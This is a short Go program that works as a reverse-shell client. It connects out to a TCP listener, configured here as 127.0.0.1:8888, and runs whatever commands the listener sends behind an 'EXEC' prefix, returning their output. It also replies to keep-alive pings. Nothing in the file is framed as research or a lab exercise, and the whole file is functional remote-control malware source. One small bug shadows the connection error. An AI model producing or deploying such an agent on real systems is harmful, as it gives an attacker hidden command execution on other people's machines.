package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

type Config struct {
	address         string
	connectInterval int
	maxConnections  int
}

func connect(config Config) (*net.TCPConn, error) {
	var err error
	for _ = range config.maxConnections {
		conn, err := net.Dial("tcp", config.address)
		if err != nil {
			fmt.Println("Error connecting:", err)
			time.Sleep(time.Duration(config.connectInterval) * time.Second)
			continue
		}
		return conn.(*net.TCPConn), nil
	}
	return nil, err
}

func execCommand(command string, conn *net.TCPConn) error {
	fmt.Println("Command:", command)
	parts := strings.Fields(command)

	// Execute the command
	output, err := exec.Command(parts[0], parts[1:]...).Output()
	if err != nil {
		fmt.Fprintln(conn, "Error executing command:", err)
		return err
	}

	// Send the output of the command back to the listener
	fmt.Fprintln(conn, string(output))
	return nil
}

func keepAlive(conn *net.TCPConn) error {
	_, err := conn.Write([]byte("ALIVE\n"))
	if err != nil {
		return err
	}

	return nil

}
func handleCommand(command string, conn *net.TCPConn) error {
	parts := strings.Split(command, "|@|")

	commandType := parts[0]
	switch commandType {
	case "EXEC":
		commandToExecute := parts[1]
		return execCommand(commandToExecute, conn)

	case "KEEP_ALIVE":
		return keepAlive(conn)

	default:
		conn.Write([]byte("No such command\n"))
		return nil

	}
}

func main() {
	config := Config{address: "127.0.0.1:8888", connectInterval: 5, maxConnections: 10}

	// Connect to the server
	conn, err := connect(config)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}

	// accept commands
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()
		err = handleCommand(command, conn)
		if err != nil {
			fmt.Println("Handeling Command Error, ", err)
		}
	}

}
